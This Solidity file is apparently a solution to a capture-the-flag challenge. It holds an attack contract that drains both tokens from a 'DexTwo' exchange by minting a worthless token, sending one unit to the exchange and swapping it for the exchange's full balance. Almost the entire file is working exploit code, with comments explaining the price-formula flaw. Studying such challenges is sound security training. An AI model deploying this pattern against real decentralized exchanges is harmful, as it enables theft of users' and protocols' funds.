// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { IERC20 } from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import { ERC20 } from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address t1);
    function token2() external view returns (address t2);
}

contract MyDex2Attack {
    constructor(address dexAddress) {
        IDexTwo dex = IDexTwo(dexAddress);
        _attack(dexAddress, dex.token1());
        _attack(dexAddress, dex.token2());
    }

    function _attack(address dex, address dexToken) private {
        IERC20 fakeToken = new MyToken();

        // swap formula is: amountTo = amountFrom * balanceTo / balanceFrom
        // transfer 1 fake token to DEX2 in order to make its balanceFrom = 1
        fakeToken.transfer(dex, 1);

        // approve DEX2 to spend 1 attacker's fake token
        fakeToken.approve(dex, 1);

        IDexTwo(dex).swap(address(fakeToken), dexToken, 1);
    }
}

contract MyToken is ERC20 {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 1000);
    }
}
